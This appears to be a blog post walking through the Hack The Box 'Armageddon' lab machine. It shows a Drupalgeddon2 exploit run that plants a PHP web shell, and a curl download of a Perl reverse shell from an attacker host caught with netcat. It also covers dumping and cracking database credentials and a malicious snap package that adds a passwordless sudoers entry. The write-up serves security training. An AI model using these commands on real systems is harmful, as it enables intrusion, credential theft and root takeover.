<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

  <title>
    
      Hack The Box - Armageddon &middot; Ryan Kozak
    
  </title>

  


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/main.css" />
  

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
<link rel="shortcut icon" href="/favicon.ico" />

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />

  <!-- Additional head bits without overriding original head -->

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Hack The Box - Armageddon | Ryan Kozak</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Hack The Box - Armageddon" />
<meta name="author" content="Ryan Kozak" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="hacking, web development, $other" />
<meta property="og:description" content="hacking, web development, $other" />
<link rel="canonical" href="http://0.0.0.0:4000/hack-the-box-armageddon/" />
<meta property="og:url" content="http://0.0.0.0:4000/hack-the-box-armageddon/" />
<meta property="og:site_name" content="Ryan Kozak" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-07-24T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hack The Box - Armageddon" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Hack The Box - Armageddon","dateModified":"2021-07-26T14:46:36+00:00","datePublished":"2021-07-24T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/hack-the-box-armageddon/"},"url":"http://0.0.0.0:4000/hack-the-box-armageddon/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


</head>


  <body class="post">

    <div id="sidebar">
  <header>
    <div class="site-title">
      <a href="/">
        
          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 0h24v24H0z" fill="none"/>
  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
</svg></span>
        
        Ryan Kozak
      </a>
    </div>
    <p class="lead">hacking, web development, $other</p>
  </header>
  <nav id="sidebar-nav-links">

  
    <a class="home-link "
        href="/">Home</a>
  

  

  

  


  
    
  

  
    
    	
      		<a class="page-link " href="/about/">About</a>
    	
    
  

  
    
    	
      		<a class="page-link " href="/contact/">Contact</a>
    	
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
    	
      		<a class="page-link " href="/books/index.html">Book List</a>
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  



  


  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  

  
  <!-- Optional additional links to insert in sidebar nav -->


</nav>


  <nav id="sidebar-icon-links">
  
    <a id="github-link"
       class="icon" title="Github Profile" aria-label="Github Profile"
       href="https://github.com/d0n601">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
</svg>

    </a>
  

  
  <a id="stackoverflow-link"
     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
     href="https://stackoverflow.com/users/4681506/ryan-kozak">
    <?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#BCBBBB;}
	.st1{fill:#F48023;}
</style>
<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
</svg>

  </a>
  

  
  
  
  

  
    <a id="tags-link"
       class="icon"
       title="Tags" aria-label="Tags"
       href="/tags/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
    </a>
  

  
    <a id="search-link"
       class="icon"
       title="Search" aria-label="Search"
       href="/search/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
    <path d="M0 0h24v24H0z" fill="none"/>
</svg>
    </a>
  

  <!-- Optional additional links to insert for icons links -->
</nav>
 
  <p class="copyright">
  &copy; 2021 Ryan Kozak.
</p>

</div>

    <main class="container">
      <header>
  <h1 class="post-title">Hack The Box - Armageddon</h1>
</header>
<div class="content">
  <div class="post-meta">
  <span class="post-date">24 Jul 2021</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        CTF Writeup
      
    
      &bull;

      
      
      

      
        Security
      
    
  </span>
</div>

  <div class="post-body">
    <p><img src="/wp-content/uploads/2021/07/armageddon/badge.png" alt="badge" /></p>

<h1 id="introduction">Introduction</h1>
<p>Armageddon is an Easy level box, and it was about as standard as standard can be. The initial foothold was straight a forward Drupal exploit, and the name of the box is a massive hint (<em><a href="https://www.exploit-db.com/exploits/44449">Druppalgeddon2</a></em>). After gaining the initial foothold, enumerating MySQL and credential stuffing gains us user privileges. All of this is pretty basic. The privilege escalation is achieved through <em><a href="https://gtfobins.github.io/gtfobins/snap/">snap</a></em>, which was interesting to me since I’d never done this before. It was not difficult to identify or exploit though.</p>

<h1 id="information-gathering">Information Gathering</h1>
<h2 id="port-scan-nmapautomator">Port Scan: nmapAutomator</h2>
<p>We begin our reconnaissance by running <em><a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></em> via <code class="highlighter-rouge">sudo ./nmapAutomator.sh 10.10.10.233 All</code>. Among many other things, this runs our port scans with increasing comprehensiveness.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Making a script scan on all ports

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 11:47 EDT
Nmap scan report for 10.10.10.233
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
</code></pre></div></div>

<p>The open ports on the machine are <strong>22</strong> and <strong>80</strong>. These are all we’ll need to proceed through the rest of the box. Let’s take a look at what’s on the web port.</p>

<h3 id="port-80">Port 80</h3>
<p>Nmap has indicated already that it’s a Drupal 7 site.<br />
<img src="/wp-content/uploads/2021/07/armageddon/0_drupal_page.png" alt="main_page" /><br />
<strong>Figure 1:</strong> Nice little chicken drawing</p>

<p>We can view the <code class="highlighter-rouge">CHANGELOG.txt</code> file to get a more specific version number. In this case it is on version <code class="highlighter-rouge">7.56</code>.<br />
<img src="/wp-content/uploads/2021/07/armageddon/0_drupal_version.png" alt="drupal_version" /><br />
<strong>Figure 2:</strong> Druapl version via CHANGELOG.txt</p>

<p>Running a quick <code class="highlighter-rouge">searchsploit drupal</code> reveals that versions <code class="highlighter-rouge">7.58</code> and below are susceptible to <em>Drupalgeddon2</em>, a remote code execution exploit.<br />
<img src="/wp-content/uploads/2021/07/armageddon/searchsploit_drupal.png" alt="searchsploit_drupal" /><br />
<strong>Figure 3:</strong> Searchsploit reveals this site may be suseptable to Drupalgeddon2.</p>

<h1 id="exploitation">Exploitation</h1>
<h2 id="initial-foothold">Initial foothold</h2>
<p>To gain our initial foothold on the machine we’ll use the exploit above. The first order of business is to add <code class="highlighter-rouge">10.10.10.233</code> to our <code class="highlighter-rouge">/etc/hosts</code> file as <code class="highlighter-rouge">armageddon.htb</code>. After this we’ll install the required gem dependency via <code class="highlighter-rouge">sudo gem install highline</code>. After we transfer the exploit to the home directory, we’ll execute it.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
└─$ ruby 44449.rb http://armageddon.htb
ruby: warning: shebang line ending with \r may cause problems
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://armageddon.htb/
--------------------------------------------------------------------------------
[+] Found  : http://armageddon.htb/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo DMGWWYDY
[+] Result : DMGWWYDY
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://armageddon.htb/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : &lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&amp;1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://armageddon.htb/shell.php' -d 'c=hostname'
armageddon.htb&gt;&gt; whoami
apache
</code></pre></div></div>

<p>The web shell above isn’t great, so we’ll simply use it to download and execute a reverse shell. In this machine’s case, we determined a Perl shell worked well.</p>

<p>Below we see the commands to transfer the shell to our attacking machine’s Apache server, and start the server. The last <code class="highlighter-rouge">vim</code> command includes modifying the listening IP and port.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[/var/www/html]
└─$ sudo cp /usr/share/webshells/perl-reverse-shell.pl /var/www/html/perl-reverse-shell.pl
┌──(kali㉿kali)-[/var/www/html]
└─$ sudo service apache2 start

┌──(kali㉿kali)-[/var/www/html]
└─$ sudo vim perl-reverse-shell.pl
</code></pre></div></div>

<p>We’ve modified the following portion of <em>perl-reverse-shell.pl</em>,</p>
<pre><code class="language-Perl"># Where to send the reverse shell.  Change these.
my $ip = '10.10.14.3';
my $port = 443;
</code></pre>

<p>First we start a Netcat listener on port 443 of the attacking machine via <code class="highlighter-rouge">sudo nc -lnvp 443</code>, and then use the web shell we’ve achieved on the victim machine to download and execute our perl reverse shell,</p>

<p>Victim downloads and executes reverse shell.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>armageddon.htb&gt;&gt; curl http://10.10.14.3/perl-reverse-shell.pl --output shell.pl
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3712  100  3712    0     0   4141      0 --:--:-- --:--:-- --:--:--  4138
armageddon.htb&gt;&gt; perl shell.pl
Content-Length: 0
Connection: close
Content-Type: text/html

Content-Length: 40
Connection: close
Content-Type: text/html

Sent reverse shell to 10.10.14.3:443&lt;p&gt;
armageddon.htb&gt;&gt;
</code></pre></div></div>

<p>Attacker catches shell.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[/var/www/html]
└─$ sudo nc -lnvp 443             
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.233] 34110
 19:18:10 up  2:32,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux armageddon.htb 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
/
apache: cannot set terminal process group (-1): Inappropriate ioctl for device
apache: no job control in this shell
apache-4.2$
</code></pre></div></div>

<h2 id="user-flag">User Flag</h2>
<p>The first thing to check after compromising a web application is often the content of its database. We’ll examine Drupal’s <code class="highlighter-rouge">settings.php</code> file to view the database credentials,</p>
<pre><code class="language-PHP">$databases = array (
  'default' =&gt;
  array (
    'default' =&gt;
    array (
      'database' =&gt; 'drupal',
      'username' =&gt; 'drupaluser',
      'password' =&gt; 'CQHEy@9M*m23gBVj',
      'host' =&gt; 'localhost',
      'port' =&gt; '',
      'driver' =&gt; 'mysql',
      'prefix' =&gt; '',
    ),
  ),
);
</code></pre>

<p>Now, logging into MySQL with username <code class="highlighter-rouge">drupaluser</code> and password <code class="highlighter-rouge">CQHEy@9M*m23gBVj</code> allows us to dump the users table and view the password hashes.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache-4.2$ mysql -u drupaluser -p drupal
mysql -u drupaluser -p drupal
Enter password: CQHEy@9M*m23gBVj
select * from users;
exit();
ERROR 1064 (42000) at line 2: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'exit()' at line 1
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu        a:1:{s:7:"overlay";i:1;}
apache-4.2$
</code></pre></div></div>

<p>We see <code class="highlighter-rouge">brucetherealadmin</code> has a hash of <code class="highlighter-rouge">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</code>. We can drop this hash into a file called <code class="highlighter-rouge">armageddon.hash</code> and try to crack it with John and the <code class="highlighter-rouge">rockyou.txt</code> wordlist.</p>

<p><img src="/wp-content/uploads/2021/07/armageddon/user.png" alt="user" /><br />
<strong>Figure 4:</strong> Cracking the password hash for <em>brucetherealadmin</em>.</p>

<p>As we can see above, the password that <em>brucetherealadmin</em> uses to login to Drupal is <code class="highlighter-rouge">booboo</code>. If we attempt the to use those same credentials to ssh into the server, we’ll see that it’s successful.</p>

<p><img src="./images/userflag.png" alt="userflag" /><br />
<strong>Figure 5:</strong> User flag by <em>brucetherealadmin</em>’s credential reuse.</p>

<h2 id="root-flag">Root Flag</h2>

<p>Running <em><a href="https://github.com/diego-treitos/linux-smart-enumeration">lse.sh</a></em> reveals that we’re able to execute <code class="highlighter-rouge">/usr/bin/snap install *</code> via sudo without a password.</p>

<p><img src="/wp-content/uploads/2021/07/armageddon/ohsnap.png" alt="ohsnap" /><br />
<strong>Figure 6:</strong> We are able to execute <code class="highlighter-rouge">/usr/bin/snap install *</code> snap packages via sudo with no password.</p>

<p>To exploit this we’ll use <code class="highlighter-rouge">fpm</code> to craft a malicious <code class="highlighter-rouge">snap</code> package. On our attacking machine we’ll first install <code class="highlighter-rouge">fpm</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──(kali㉿kali)-[/var/www/html]
└─$ sudo gem install --no-document fpm                                                                                                                                                                                                 1 ⨯
Fetching arr-pm-0.0.10.gem
Fetching io-like-0.3.1.gem
Fetching backports-3.21.0.gem
Fetching ruby-xz-0.2.3.gem
Fetching cabin-0.9.0.gem
Fetching childprocess-0.9.0.gem
Fetching clamp-1.0.1.gem
Fetching stud-0.0.23.gem
Fetching git-1.8.1.gem
Fetching fpm-1.12.0.gem
Fetching insist-1.0.0.gem
Fetching mustache-0.99.8.gem
Fetching dotenv-2.7.6.gem
Fetching pleaserun-0.0.32.gem
Successfully installed cabin-0.9.0
Successfully installed backports-3.21.0
Successfully installed arr-pm-0.0.10
Successfully installed clamp-1.0.1
Successfully installed childprocess-0.9.0
Successfully installed io-like-0.3.1
Successfully installed ruby-xz-0.2.3
Successfully installed stud-0.0.23
Successfully installed mustache-0.99.8
Successfully installed insist-1.0.0
Successfully installed dotenv-2.7.6
Successfully installed pleaserun-0.0.32
Successfully installed git-1.8.1
Successfully installed fpm-1.12.0
14 gems installed
</code></pre></div></div>

<p>As per the <em><a href="https://gtfobins.github.io/gtfobins/snap/">GTFObin’s instructions</a></em> we craft the packet. We’ll modify the command in those instructions to be <code class="highlighter-rouge">COMMAND="echo 'brucetherealadmin ALL=(ALL) NOPASSWD:/bin/bash' &gt;&gt; /etc/sudoers"</code>, so that <em>brucetherealadmin</em> can sudo with no password at all. We then transfer this package to our Apache server’s directory as <code class="highlighter-rouge">oh.snap</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
└─$ COMMAND="echo 'brucetherealadmin ALL=(ALL) NOPASSWD:/bin/bash' &gt;&gt; /etc/sudoers"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" &gt;meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
Created package {:path=&gt;"xxxx_1.0_all.snap"}

┌──(kali㉿kali)-[/tmp/tmp.CkDpHzKVN8]
└─$ sudo mv xxxx_1.0_all.snap /var/www/html/oh.snap                                

┌──(kali㉿kali)-[/tmp/tmp.CkDpHzKVN8]
└─$
</code></pre></div></div>

<p>Now, after downloading <code class="highlighter-rouge">oh.snap</code> we execute <code class="highlighter-rouge">sudo /usr/bin/snap install oh.snap --dangerous --devmode</code> to install the package. This will allow <em>brucetherealadmin</em> to execute <code class="highlighter-rouge">sudo /bin/bash</code> and get us a root shell.</p>

<p><img src="/wp-content/uploads/2021/07/armageddon/rootshell.png" alt="rootshell" /><br />
<strong>Figure 7:</strong> Installing <code class="highlighter-rouge">oh.snap</code> allows us to <code class="highlighter-rouge">sudo</code> with no password to gain a root shell.</p>

<h1 id="conclusion">Conclusion</h1>
<p>This box was fairly entertaining, and very straight forward. Sometimes I don’t mind an easy one at all. Obviously the way that the root shell is achieved should be cleaned up if we cared at all about hiding our tracks :).</p>

<h1 id="references">References</h1>
<ol>
  <li><a href="https://www.exploit-db.com/exploits/44449">Drupalgeddon2 Exploit</a></li>
  <li><a href="https://gtfobins.github.io/gtfobins/snap/">GTFO Bins for snap + sudo</a></li>
</ol>

    



<div class="post-tags">
  
    
    <a href="/tags/#ctf">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">CTF</span>
    </a>
  
    
    <a href="/tags/#hack-the-box">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Hack The Box</span>
    </a>
  
    
    <a href="/tags/#linux">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Linux</span>
    </a>
  
    
    <a href="/tags/#drupal">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Drupal</span>
    </a>
  
    
    <a href="/tags/#snap">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">snap</span>
    </a>
  
</div>
  </div>

  
  <section class="comments">
    <h2>Comments</h2>
    
  <div id="disqus_thread">
    <button class="disqus-load" onClick="loadDisqusComments()">
      Load Comments
    </button>
  </div>
  <script>

  /**
  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
  *  https://disqus.com/admin/universalcode/#configuration-variables
  */
  var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/hack-the-box-armageddon/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "" || "http://0.0.0.0:4000/hack-the-box-armageddon/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
  }
  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = '//https-ryankozak-com.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
  }
  </script>
  <noscript>
    Please enable JavaScript to view the
